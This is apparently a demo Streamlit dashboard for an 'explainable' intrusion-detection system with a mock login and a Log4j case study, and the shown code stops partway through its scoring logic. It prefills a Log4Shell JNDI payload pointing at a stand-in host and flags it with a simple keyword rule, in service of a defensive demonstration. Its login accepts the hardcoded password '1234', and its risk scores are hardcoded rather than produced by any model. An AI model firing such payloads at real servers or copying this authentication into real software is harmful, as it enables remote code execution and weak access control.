import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import time

# --- PAGE CONFIGURATION ---
st.set_page_config(page_title="XAI-IDS Secure Portal", page_icon="🔒", layout="wide")

# --- CUSTOM CSS ---
st.markdown("""
    <style>
    .stApp { background-color: #050505; color: #00FF41; font-family: 'Courier New', Courier, monospace; }
    .stTextInput > div > div > input { color: #00FF41; background-color: #111; border-color: #00FF41; }
    .stButton>button { color: #000; background-color: #00FF41; border-color: #00FF41; }
    </style>
    """, unsafe_allow_html=True)

# --- SESSION STATE ---
if 'logged_in' not in st.session_state:
    st.session_state['logged_in'] = False

# ==========================================
# 🔒 SCENE 1: THE LOGIN SCREEN
# ==========================================
if not st.session_state['logged_in']:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.title("🔒 RESTRICTED ACCESS")
        st.markdown("`SECURITY LEVEL: TOP SECRET`")
        st.divider()
        username = st.text_input("ENTER USERNAME:")
        password = st.text_input("ENTER ACCESS CODE:", type="password")
        if st.button("AUTHENTICATE"):
            if password == "1234":
                with st.spinner("VERIFYING BIOMETRICS..."):
                    time.sleep(1.0)
                st.success("ACCESS GRANTED")
                time.sleep(0.5)
                st.session_state['logged_in'] = True
                st.session_state['user'] = username
                st.rerun()
            else:
                st.error("🚫 ACCESS DENIED")

# ==========================================
# 🛡️ SCENE 2: THE DASHBOARD
# ==========================================
else:
    if st.sidebar.button("LOGOUT"):
        st.session_state['logged_in'] = False
        st.rerun()

    user_name = st.session_state.get('user', 'ANALYST')
    st.title(f"🛡️ WELCOME, {user_name.upper()}")
    st.markdown("`SYSTEM: ONLINE` | `TARGET: LOG4J ANALYSIS`")
    st.divider()

    # --- SIDEBAR ---
    st.sidebar.header("🕹️ CONTROL PANEL")
    
    # Mode Selection
    mode = st.sidebar.radio("Select Mode:", ["Real-World Case Study (Log4j)", "Manual Packet Injection"])

    # Default Initialization
    p_size = 64
    protocol = "TCP"
    payload_input = "None"
    scenario = "Manual"

    if mode == "Real-World Case Study (Log4j)":
        st.sidebar.markdown("---")
        st.sidebar.info("⚠️ **SCENARIO:** Simulating the 2021 Minecraft/Amazon Hack.")
        payload_input = st.sidebar.text_input("Inject Payload:", "${jndi:ldap://evil.com/exploit}")
        p_size = 512
        protocol = "HTTP"
        scenario = "Log4j"
    else:
        st.sidebar.markdown("---")
        p_size = st.sidebar.slider("Packet Size (bytes)", 0, 2000, 64)
        protocol = st.sidebar.selectbox("Protocol", ["TCP", "UDP", "HTTP", "ICMP"])
        scenario = "Manual"

    # --- MAIN SCAN BUTTON ---
    if st.button("🚀 INITIATE SYSTEM SCAN"):
        
        with st.status("📡 SCANNING NETWORK...", expanded=True) as status:
            time.sleep(0.5)
            st.write(">> DEEP PACKET INSPECTION...")
            time.sleep(0.5)
            status.update(label="✅ SCAN COMPLETE", state="complete", expanded=False)

        # 2. LOGIC ENGINE
        risk_score = 0.1
        reasons = {}
        verdict = "BENIGN"
        color = "green"

        # --- LOGIC BRANCHING ---
        if scenario == "Log4j":
            # LOG4J SPECIFIC LOGIC
            if "${jndi:" in payload_input or "ldap" in payload_input:
                risk_score = 0.99
                verdict = "CRITICAL (Log4Shell Exploit)"
                color = "red"
                reasons = {
                    "Token '${jndi'": 0.95, 
                    "Protocol 'ldap'": 0.88, 
                    "Payload Entropy": 0.60
                }
            else:
                # SAFE PAYLOAD LOGIC
                risk_score = 0.2
                verdict = "BENIGN (Safe Payload)"
                color = "green"
                reasons = {"Text Content": -0.5}

        else:
            # MANUAL PACKET LOGIC
            if p_size > 800:
                risk_score += 0.4
                reasons["Packet Size"] = 0.8
            else:
                reasons["Packet Size"] = -0.2
            
            if protocol == "UDP":
                risk_score += 0.3
